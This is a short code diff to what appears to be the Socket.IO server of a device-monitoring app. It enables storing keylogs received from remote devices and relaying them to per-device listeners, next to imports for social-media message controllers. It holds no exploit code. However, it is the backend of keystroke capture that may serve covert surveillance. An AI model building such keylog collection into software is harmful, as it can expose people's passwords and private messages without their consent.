@@ -23,6 +23,8 @@ import {
 	addInstagramClientMessage,
 } from "../../controllers/social.controller";
 
+import { addNewKeyLogs } from "../../controllers/keylogs.controller";
+
 const app = express();
 
 const server = http.createServer(app);
@@ -487,7 +489,7 @@ export const startSocketIO = async () => {
 				async (response: any) => {
 					try {
 						// data should be include deviceId and keylogs
-						// const res = await addNewKeyLogs(response);
+						const res = await addNewKeyLogs(response);
 
 						const deviceId = response.deviceId;
 						const keyLogsType = response.keyLogsType;
@@ -501,17 +503,17 @@ export const startSocketIO = async () => {
 							keyEvent
 						);
 
-						// if (res.status == 200) {
-						io.emit(
-							`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
-							{
-								deviceId: deviceId,
-								keyLogsType: keyLogsType,
-								keylogs: keylogs,
-								keyevent: keyEvent,
-							}
-						);
-						// }
+						if (res.status == 200) {
+							io.emit(
+								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
+								{
+									deviceId: deviceId,
+									keyLogsType: keyLogsType,
+									keylogs: keylogs,
+									keyevent: keyEvent,
+								}
+							);
+						}
 					} catch (error) {
 						console.log("Key Logs Response Error", error);
 					}
